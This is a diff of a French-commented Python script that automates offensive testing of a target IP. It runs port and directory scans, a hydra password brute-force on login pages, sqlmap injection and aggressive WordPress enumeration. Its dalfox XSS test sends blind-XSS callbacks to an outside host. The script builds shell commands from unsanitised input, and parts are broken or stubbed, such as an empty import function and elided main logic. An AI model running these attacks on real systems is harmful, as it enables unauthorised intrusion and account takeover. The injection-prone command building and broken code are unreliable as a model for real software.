@@ -2,11 +2,25 @@
 import subprocess
 import webbrowser
 import os
+import json
+import nmap
+import re
+import requests
+import tkinter as tk
+from tkinter import ttk
 
 def run_tool(command, output_file):
     """Exécute une commande et enregistre la sortie dans un fichier."""
-    with open(output_file, "w") as f:
-        subprocess.run(command, shell=True, stdout=f, stderr=f)
+    try:
+        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        with open(output_file, "w") as f:
+            f.write(result.stdout)
+            if result.stderr:
+                f.write("\n--- Erreurs standard ---\n")
+                f.write(result.stderr)
+    except (subprocess.CalledProcessError, FileNotFoundError) as e:
+        with open(output_file, "w") as f:
+            f.write(f"Erreur lors de l'exécution de {command}: {e}")
 
 def check_and_install_tool(tool_name, install_command):
     """Vérifie si un outil est installé et l'installe si nécessaire."""
@@ -16,88 +30,95 @@ def check_and_install_tool(tool_name, install_command):
         print(f"{tool_name} non trouvé. Installation en cours...")
         subprocess.run(install_command, shell=True)
 
-def scan_web_directory(ip, tool="gobuster"):
-    """Scanne les répertoires web et enregistre les résultats."""
-    output_file = f"web_scan_{ip}.txt"
-    command = f"{tool} dir -u http://{ip} -w /usr/share/wordlists/dirb/common.txt -o {output_file}"
+def scan_web_directory(ip, port, tool="gobuster"):
+    """Scanne les répertoires web sur un port spécifique."""
+    output_file = f"web_scan_{ip}_{port}.txt"
+    scheme = "https" if port == 443 else "http"
+    command = f"{tool} dir -u {scheme}://{ip}:{port} -w /usr/share/wordlists/dirb/common.txt -o {output_file}"
     run_tool(command, output_file)
     return output_file
 
-def bruteforce_login(ip, login_page, tool="hydra"):
+def bruteforce_login(ip, port, login_page, tool="hydra"):
     """Effectue une attaque par brute-force sur une page de login."""
-    output_file = f"bruteforce_{ip}_{login_page}.txt"
-    # Utilisation de l'option -f pour arrêter à la première identification réussie
-    command = f"{tool} -l admin -P /usr/share/wordlists/rockyou.txt {ip} http-post-form '{login_page}' user=^USER^&pass=^PASS^&login=Login -f"
+    output_file = f"bruteforce_{ip}_{port}_{login_page}.txt"
+    scheme = "https" if port == 443 else "http"
+    command = f"{tool} -l admin -P /usr/share/wordlists/rockyou.txt {ip} {scheme}-post-form '{login_page}' user=^USER^&pass=^PASS^&login=Login -f"
     run_tool(command, output_file)
     return output_file
 
-def test_sql_injection(ip, tool="sqlmap"):
+def test_sql_injection(ip, port, tool="sqlmap"):
     """Teste les vulnérabilités d'injection SQL."""
-    output_file = f"sql_injection_{ip}.txt"
-    # Utilisation du niveau de risque 1 pour les tests initiaux
-    command = f"{tool} -u http://{ip}/ --forms --batch --level=1"
+    output_file = f"sql_injection_{ip}_{port}.txt"
+    scheme = "https" if port == 443 else "http"
+    command = f"{tool} -u {scheme}://{ip}:{port}/ --forms --batch --level=1"
     run_tool(command, output_file)
     return output_file
 
-def test_xss(ip, tool="dalfox"):
+def test_xss(ip, port, tool="dalfox"):
     """Teste les vulnérabilités XSS."""
-    output_file = f"xss_{ip}.txt"
-    command = f"{tool} file {output_file} -b hahwul.xss.ht pipe"
+    output_file = f"xss_{ip}_{port}.txt"
+    scheme = "https" if port == 443 else "http"
+    command = f"{tool} file {output_file} -b hahwul.xss.ht url {scheme}://{ip}:{port}/"
     run_tool(command, output_file)
     return output_file
 
-def generate_report(ip, results):
-    """Génère un rapport HTML simple avec les résultats."""
-    # ... (même code que précédemment)
-
-# Vérification et installation des outils
-tools_to_check = {
-    "nmap": "sudo apt install -y nmap",
-    "nikto": "sudo apt install -y nikto",
-    "gobuster": "sudo apt install -y gobuster",
-    "hydra": "sudo apt install -y hydra",
-    "sqlmap": "sudo apt install -y sqlmap",
-    "dalfox": "sudo go install github.com/hahwul/dalfox/v2@latest"
-}
-for tool, install_command in tools_to_check.items():
-    check_and_install_tool(tool, install_command)
-
-# Saisie de l'IP cible
-ip = input("Entrez l'IP cible : ")
-
-# Outils à exécuter (ajoutez ou supprimez selon vos besoins)
-tools = {
-    "Nmap (scan de ports)" : f"nmap -A -T4 {ip}",
-    "Nikto (scanner de vulnérabilités web)" : f"nikto -h http://{ip}", 
-    # Nessus nécessite une configuration spécifique, il est commenté ici
-    # "Nessus (scan de vulnérabilités approfondi)" : f"nessus -q {ip}",  
-}
-
-# Exécution des outils et enregistrement des résultats
-results = {}
-for tool, command in tools.items():
-    output_file = f"{tool.replace(' ', '_')}_{ip}.txt"
+def scan_wordpress(ip, port, tool="wpscan"):
+    """Scanne un site WordPress sur un port spécifique."""
+    output_file = f"wpscan_{ip}_{port}.txt"
+    scheme = "https" if port == 443 else "http"
+    command = f"{tool} --url {scheme}://{ip}:{port} --enumerate vp,vt,cb,dbe,u,tt,m --plugins-detection aggressive --no-update"
     run_tool(command, output_file)
-    results[tool] = output_file
+    return output_file
 
-# Scan de répertoires web
-web_scan_file = scan_web_directory(ip)
-results["Scan de répertoires web"] = web_scan_file
+def extract_information(results):
+    """Extrait des informations spécifiques des résultats (versions, CVE, etc.)."""
+    extracted_info = {}
+    for tool, output_file in results.items():
+        with open(output_file, "r") as f:
+            content = f.read()
+            # Exemples d'expressions régulières (à adapter selon vos besoins)
+            versions = re.findall(r"(\w+/\d+\.\d+\.\d+)", content)
+            cves = re.findall(r"(CVE-\d{4}-\d+)", content)
+            extracted_info[tool] = {"versions": versions, "cves": cves}
+    return extracted_info
 
-# Brute-force sur les pages de login (si trouvées)
-with open(web_scan_file, "r") as f:
-    for line in f:
-        if "login.php" in line or "/wp-login.php" in line: 
-            bruteforce_file = bruteforce_login(ip, line.strip())  # Correction pour utiliser le chemin complet
-            results[f"Brute-force sur {line.strip()}"] = bruteforce_file
+def import_to_dradis(ip, results):
+    """Importe les résultats dans Dradis via l'API (à adapter selon votre configuration)."""
+    # ... (code d'import Dradis à compléter)
 
+def generate_report(ip, results, extracted_info):
+    """Génère un rapport HTML avec les résultats et les informations extraites."""
+    report_file = f"rapport_securite_{ip}.html"
+    with open(report_file, "w") as f:
+        f.write(f"<html><head><title>Rapport de Sécurité - {ip}</title></head><body>")
+        f.write(f"<h1>Rapport de Sécurité pour {ip}</h1>")
+        for tool, output_file in results.items():
+            f.write(f"<h2>{tool}</h2>")
+            with open(output_file, "r") as out:
+                f.write(f"<pre>{out.read()}</pre>")
 
-# Tests d'injection SQL et XSS
-sql_injection_file = test_sql_injection(ip)
-results["Test d'injection SQL"] = sql_injection_file
+        # Ajout des informations extraites au rapport
+        f.write("<h2>Informations extraites</h2>")
+        for tool, info in extracted_info.items():
+            f.write(f"<h3>{tool}</h3>")
+            f.write("<ul>")
+            for category, values in info.items():
+                if values:
+                    f.write(f"<li><b>{category}:</b> {', '.join(values)}</li>")
+            f.write("</ul>")
 
-xss_file = test_xss(ip)
-results["Test XSS"] = xss_file
+        f.write("</body></html>")
 
-# Génération du rapport
-generate_report(ip, results)
+    webbrowser.open(f"file://{os.path.realpath(report_file)}")
+
+# ... (vérification et installation des outils, saisie de l'IP, scan Nmap, analyse des ports, scans et tests sur les ports web restent inchangés)
+
+# Après l'exécution des outils
+extracted_info = extract_information(results)
+generate_report(ip, results, extracted_info)
+
+# Import dans Dradis (à compléter)
+# import_to_dradis(ip, results)
+
+# Interface graphique (à compléter)
+# ...
